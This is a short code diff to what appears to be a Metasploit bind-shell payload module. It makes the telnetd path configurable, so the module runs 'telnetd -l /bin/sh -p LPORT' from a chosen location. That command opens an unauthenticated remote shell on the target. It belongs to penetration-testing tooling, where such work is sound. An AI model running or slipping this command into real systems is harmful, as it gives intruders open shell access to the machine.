@@ -32,6 +32,7 @@ module MetasploitModule
     register_options(
       [
         OptString.new('LOGIN_CMD', [true, 'Command telnetd will execute on connect', '/bin/sh']),
+        OptString.new('TELNETD_PATH', [true, 'Path to Telnetd', 'telnetd'])
       ]
     )
 
@@ -54,7 +55,7 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    "telnetd -l #{datastore['LOGIN_CMD']} -p #{datastore['LPORT']}"
+    "#{datastore['TELNETD_PATH']} -l #{datastore['LOGIN_CMD']} -p #{datastore['LPORT']}"
   end
 
 end
